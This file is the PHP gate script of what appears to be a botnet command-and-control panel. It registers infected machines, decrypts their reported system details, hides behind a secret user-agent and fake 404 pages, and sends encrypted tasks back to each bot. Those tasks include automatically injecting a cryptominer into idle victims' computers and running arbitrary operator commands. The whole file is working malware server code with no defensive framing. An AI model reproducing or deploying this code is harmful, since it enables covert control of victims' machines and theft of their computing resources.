<?php
	include 'config.php';
	include 'functions.php';
	include 'assets/geo/geoip.inc';
	$gi = geoip_open("assets/geo/GeoIP.dat", "");
	
	$gate = $odb->query("SELECT gate_status FROM settings")->fetchColumn(0);
	if ($gate != "1")
	{
		die();
	}
	
if (!isset($_POST['id']) || !isset($_POST['os']) || !isset($_POST['pv']) || !isset($_POST['ip']) || !isset($_POST['cn']) || !isset($_POST['bv']))
{
    include 'pages/404.php';
    die();
}
if ($_SERVER['HTTP_USER_AGENT'] != "pZBsGN4sqXDtFoPzNGbh")
{
    include 'pages/404.php';
    die();
}






$ip = $_SERVER['REMOTE_ADDR'];
	$country = geoip_country_id_by_addr($gi, $ip);
	
	$hwid  = decrypt($config["connectionkey"], $_POST['id']);
	$opsys = decrypt($config["connectionkey"], $_POST['os']);
	$privs = decrypt($config["connectionkey"], $_POST['pv']);
	$miningstatus = decrypt($config["connectionkey"], $_POST['ms']);
	$cpu = decrypt($config["connectionkey"], $_POST['cpu']);
	$gpu = decrypt($config["connectionkey"], $_POST['gpu']);
	$inpat = base64_encode(decrypt($config["connectionkey"], $_POST['ip']));
	$compn = base64_encode(decrypt($config["connectionkey"], $_POST['cn']));
	$botvr = decrypt($config["connectionkey"], $_POST['bv']);
	$lastr = base64_encode(decrypt($config["connectionkey"], $_POST['lr']));
	$opera = "0";
	$taskd = "0";
	$unins = "0";

	if (isset($_POST['op']))
	{
		$opera = decrypt($config["connectionkey"], $_POST['op']);
	}
	if (isset($_POST['td']))
	{
		$taskd = decrypt($config["connectionkey"], $_POST['td']);
	}
	if (isset($_POST['uni']))
	{
		$unins = decrypt($config["connectionkey"], $_POST['uni']);
	}
	
	
	if (!ctype_alnum($hwid) || !ctype_alnum($privs) || !ctype_alnum($opera) || !ctype_alnum($taskd) || !ctype_alnum($unins) || !preg_match('/^[a-z0-9 .]+$/i', $botvr) || !preg_match('/^[a-z0-9 .]+$/i', $opsys))
	{
		include 'pages/404.php';
		die();
	}



	$exs = $odb->prepare("SELECT COUNT(*) FROM bots WHERE bothwid = :h");
	$exs->execute(array(":h" => $hwid));
	if ($exs->fetchColumn(0) == "0")
	{
		try {
			$i = $odb->prepare("INSERT INTO bots VALUES(NULL, :hw, :ip, :cn, UNIX_TIMESTAMP(), UNIX_TIMESTAMP(), :td, :os, :bv, :pv, :in, :cp, :lr, :ms, :lastminerstart, :cpu, :gpu, '1')");
			$i->execute(array(":hw" => $hwid, ":ip" => $ip, ":cn" => $country, ":td" => $taskd, ":os" => $opsys, ":bv" => $botvr, ":pv" => $privs, ":in" => $inpat, ":cp" => $compn, ":lr" => $lastr, ":ms" =>$miningstatus, ":lastminerstart"=> time() + strtotime('-5 hours'), ":cpu" => $cpu, ":gpu" => $gpu));
		}
		catch(Exception $e) {
			file_put_contents("error",$e->getMessage());
		}

	}else{
		$u = $odb->prepare("UPDATE bots SET lastresponse = UNIX_TIMESTAMP(), currenttask = :c,miningstatus = :ms WHERE bothwid = :h");
		$u->execute(array(":c" => $taskd, ":h" => $hwid,":ms" =>$miningstatus));
	}

	
    if($odb->query("SELECT miner_autostart FROM settings LIMIT 1")->fetchColumn(0) == 1){
        // Autorun Miner if idle
        if($odb->query("SELECT miningstatus FROM bots WHERE bothwid='".$hwid."' LIMIT 1")->fetchColumn(0) == "Idle"){
            $mining = $odb->query("SELECT mining_algorithm,mining_server,mining_username,mining_password FROM settings LIMIT 1")->fetch();

			$miner = 'http://'. $_SERVER['SERVER_NAME'] . str_replace("/gate.php","",$_SERVER['REQUEST_URI'])."/plugins/miner/";
			if (strpos($gpu, 'NVIDIA') !== false) {
			//	$id = base64_encode("3"); //Drop
			//	$miner .= "xmrignvidia.exe~";
			$id = base64_encode("11"); //Inject
			$miner .= "cpu.exe~";	
			}else{
				$id = base64_encode("11"); //Inject
				$miner .= "cpu.exe~";
            }
            $miner_hwidAsUser =  $odb->query("SELECT miner_hwidAsUser FROM settings LIMIT 1")->fetchColumn(0);
            if($miner_hwidAsUser == 0){
                $hwid = base64_decode($mining["mining_username"]);
            }
			$url = $miner."-B -a ". base64_decode($mining["mining_algorithm"])." --donate-level=0 -t 1 --url=".base64_decode($mining["mining_server"])." -u ".$hwid." -p ". base64_decode($mining["mining_algorithm"]);
            echo encrypt($config["connectionkey"], 'newtask:miner_autostart:'.$id.':'.base64_encode(base64_encode(($url))));
            die();
        }
    }

if ($opera == "1")
	{
		$in = $odb->prepare("INSERT INTO tasks_completed VALUES(NULL, :h, :i)");
		$in->execute(array(":h" => $hwid, ":i" => $taskd));
	}
	if ($unins == "1")
	{
		$del = $odb->prepare("DELETE FROM bots WHERE bothwid = :h LIMIT 1");
		$del->execute(array(":h" => $hwid));
	}
	
	$cmds = $odb->query("SELECT * FROM tasks ORDER BY id");
	while ($com = $cmds->fetch(PDO::FETCH_ASSOC))
	{
		if ($com['status'] == "1")
		{
			$executions = $odb->query("SELECT COUNT(*) FROM tasks_completed WHERE taskid = '".$com['id']."'")->fetchColumn(0);
			if ($executions == $com['executions'])
			{
				continue;
			}elseif($com["execution_only"] == $hwid ){
                $ae = $odb->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
                $ae->execute(array(":i" => $com['id'], ":h" => $hwid));
                if ($ae->fetchColumn(0) == 0)
                {
                    echo encrypt($config["connectionkey"], 'newtask:'.$com['id'].':'.base64_encode($com['task']).':'.base64_encode($com['params']));
                    break;
                }
            } else{
				$ae = $odb->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i AND bothwid = :h");
				$ae->execute(array(":i" => $com['id'], ":h" => $hwid));
				if ($ae->fetchColumn(0) == 0)
				{
					echo encrypt($config["connectionkey"], 'newtask:'.$com['id'].':'.base64_encode($com['task']).':'.base64_encode($com['params']));
					//file_put_contents("ok", 'newtask:'.$com['id'].':'.$com['task'].':'.$com['params']);
					break;
				}
			}
		}
	}
	?>